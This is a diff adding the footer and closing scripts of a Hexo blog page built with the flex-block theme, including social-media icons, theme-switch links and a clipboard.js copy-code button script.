+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+<script type="text/javascript">
+	(function () {
+		function getCodeType (elem) {
+			const classs = Array.from(elem.classList.values());
+			if (classs && classs.length > 1) {
+				return classs[1];
+			}
+			return "plain";
+		}
+
+		window.addEventListener("DOMContentLoaded", () => {
+			const copyBtnClass = "copy-btn";
+			//  instantiate clipboardjs 
+			const clipboard = new ClipboardJS('.' + copyBtnClass);
+
+			clipboard.on('success', function (e) {
+				console.info('Action:', e.action);
+				console.info('Text:', e.text);
+				console.info('Trigger:', e.trigger);
+				if (e.trigger) {
+					e.trigger.classList.add("copied");
+					setTimeout(() => {
+						e.trigger.classList.remove("copied");
+					}, 3000);
+				}
+				e.clearSelection();
+			});
+
+			clipboard.on('error', function (e) {
+				console.error('Action:', e.action);
+				console.error('Trigger:', e.trigger);
+			});
+
+			document.querySelectorAll('figure.highlight').forEach((elem) => {
+				const codeContent = elem.querySelector("td.code");
+				const copyButton = document.createElement('button');
+				copyButton.setAttribute("class", copyBtnClass);
+				copyButton.setAttribute("title", "Copy Code");
+				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
+				elem.insertBefore(copyButton, elem.children[0]);
+			});
+		})
+	})();
+</script>
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
